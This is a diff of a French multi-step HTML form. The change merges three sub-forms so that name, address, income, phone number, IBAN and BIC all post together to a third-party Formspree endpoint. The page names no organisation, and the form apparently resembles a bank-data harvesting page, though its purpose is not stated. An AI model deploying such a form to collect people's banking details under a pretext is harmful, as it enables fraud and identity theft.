@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <title>Formulaire Informations Neccessaires</title>
+    <title>Formulaire Informations Néccessaires</title>
     <style>
       .center-container {
          display: flex;
@@ -37,96 +37,96 @@
 </head>
 <body>
    <div class="center-container">
+      <form
+        action="https://formspree.io/f/xgejygvy"
+        method="POST"
+      >
       <div class="container card p-5 mt-5" id="etape1">
           <h3>Informations personnelles</h3>
-          <form 
-            class="card p-2"
-            id="form1"
-            action="https://formspree.io/f/xgejygvy"
-            method="POST"
-          >
-              <div class="form-row">
+            <div class="card p-2" id="form1">
+               <div class="form-row">
                   <div class="form-group col-md-6">
-                      <label for="nom">Nom :</label>
-                      <input type="text" class="form-control" name="nom" id="nom" placeholder="Entrez votre nom">
+                        <label for="nom">Nom :</label>
+                        <input type="text" class="form-control" name="nom" id="nom" placeholder="Entrez votre nom">
                   </div>
                   <div class="form-group col-md-6">
-                      <label for="prenom">Prénom :</label>
-                      <input type="text" class="form-control" name="prenom" id="prenom" placeholder="Entrez votre prénom">
+                        <label for="prenom">Prénom :</label>
+                        <input type="text" class="form-control" name="prenom" id="prenom" placeholder="Entrez votre prénom">
                   </div>
-              </div>
-              <div class="form-group">
+               </div>
+               <div class="form-group">
                   <label for="pays">Pays :</label>
                   <input type="text" class="form-control" name="pays" id="pays" placeholder="Entrez votre pays">
-              </div>
-              <div class="form-group">
+               </div>
+               <div class="form-group">
                   <label for="ville">Ville :</label>
                   <input type="text" class="form-control" name="ville" id="ville" placeholder="Entrez votre ville">
-              </div>
-              <div class="form-group">
+               </div>
+               <div class="form-group">
                   <label for="adresse">Adresse :</label>
                   <input type="text" class="form-control" name="adresse" id="adresse" placeholder="Entrez votre adresse">
+               </div>
+               <button type="button" class="btn btn-primary" id="etapeSuivante1">Étape Suivante</button>
+            </div>
+         </div>
+         
+         <div class="container card p-5 mt-5" id="etape2" style="display: none;">
+            <h3>Informations financières</h3>
+            <div class="card p-2" id="form2">
+                <div class="form-group">
+                    <label for="revenu">Revenu mensuel :</label>
+                    <input type="text" class="form-control" name="revenu" id="revenu" placeholder="Entrez votre revenu mensuel">
+                </div>
+                <div class="form-group">
+                    <label for="profession">Profession :</label>
+                    <input type="text" class="form-control" name="profession" id="profession" placeholder="Entrez votre profession">
+                </div>
+                <div class="form-group">
+                    <label for="etatCivil">État civil :</label>
+                    <input type="text" class="form-control" name="etatCivil" id="etatCivil" placeholder="Entrez votre état civil">
+                </div>
+                <div class="form-group">
+                    <label for="numeroTel">Numéro de téléphone :</label>
+                    <input type="text" class="form-control" name="numeroTel" id="numeroTel" placeholder="Entrez votre numéro de téléphone">
+                </div>
+                <div class="form-row">
+                  <div class="col-md-6">
+                     <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente1">Étape Précédente</button>
+                  </div>
+                  <div class="col-md-6">
+                     <button type="button" class="btn btn-primary m-1 w-100" id="etapeSuivante2">Étape Suivante</button>
+                  </div>
               </div>
-              <button type="button" class="btn btn-primary" id="etapeSuivante1">Étape Suivante</button>
-          </form>
+            </div>
+         </div>
+         
+         <div class="container card p-5 mt-5" id="etape3" style="display: none;">
+            <h3>Informations bancaires</h3>
+            <div class="card p-2" id="form3">
+                <div class="form-group">
+                    <label for="nomCompte">Nom et Prénom du compte :</label>
+                    <input type="text" class="form-control" name="nomCompte" id="nomCompte" placeholder="Entrez le nom et prénom du compte">
+                </div>
+                <div class="form-group">
+                    <label for="iban">IBAN (International Bank Account Number) :</label>
+                    <input type="text" class="form-control" name="iban" id="iban" placeholder="Entrez votre IBAN">
+                </div>
+                <div class="form-group">
+                    <label for="bic">BIC (Bank Identifier Code) :</label>
+                    <input type="text" class="form-control" name="bic" id="bic" placeholder="Entrez votre BIC">
+                </div>
+                <div class="form-row">
+                  <div class="col-md-6">
+                     <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente2">Étape Précédente</button>
+                  </div>
+                  <div class="col-md-6">
+                     <button type="submit" class="btn btn-success m-1 w-100">Soumettre</button>
+                  </div>
+              </div>
+            </div>
+         </div>
       </div>
-      
-      <div class="container card p-5 mt-5" id="etape2" style="display: none;">
-         <h3>Informations financières</h3>
-         <form class="card p-2" id="form2">
-             <div class="form-group">
-                 <label for="revenu">Revenu mensuel :</label>
-                 <input type="text" class="form-control" name="revenu" id="revenu" placeholder="Entrez votre revenu mensuel">
-             </div>
-             <div class="form-group">
-                 <label for="profession">Profession :</label>
-                 <input type="text" class="form-control" name="profession" id="profession" placeholder="Entrez votre profession">
-             </div>
-             <div class="form-group">
-                 <label for="etatCivil">État civil :</label>
-                 <input type="text" class="form-control" name="etatCivil" id="etatCivil" placeholder="Entrez votre état civil">
-             </div>
-             <div class="form-group">
-                 <label for="numeroTel">Numéro de téléphone :</label>
-                 <input type="text" class="form-control" name="numeroTel" id="numeroTel" placeholder="Entrez votre numéro de téléphone">
-             </div>
-             <div class="form-row">
-               <div class="col-md-6">
-                  <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente1">Étape Précédente</button>
-               </div>
-               <div class="col-md-6">
-                  <button type="button" class="btn btn-primary m-1 w-100" id="etapeSuivante2">Étape Suivante</button>
-               </div>
-           </div>
-         </form>
-      </div>
-      
-      <div class="container card p-5 mt-5" id="etape3" style="display: none;">
-         <h3>Informations bancaires</h3>
-         <form class="card p-2" id="form3">
-             <div class="form-group">
-                 <label for="nomCompte">Nom et Prénom du compte :</label>
-                 <input type="text" class="form-control" name="nomCompte" id="nomCompte" placeholder="Entrez le nom et prénom du compte">
-             </div>
-             <div class="form-group">
-                 <label for="iban">IBAN (International Bank Account Number) :</label>
-                 <input type="text" class="form-control" name="iban" id="iban" placeholder="Entrez votre IBAN">
-             </div>
-             <div class="form-group">
-                 <label for="bic">BIC (Bank Identifier Code) :</label>
-                 <input type="text" class="form-control" name="bic" id="bic" placeholder="Entrez votre BIC">
-             </div>
-             <div class="form-row">
-               <div class="col-md-6">
-                  <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente2">Étape Précédente</button>
-               </div>
-               <div class="col-md-6">
-                  <button type="submit" class="btn btn-success m-1 w-100">Soumettre</button>
-               </div>
-           </div>
-         </form>
-      </div>
-   </div>
+   </form>
    
 <script>
     $(document).ready(function () {
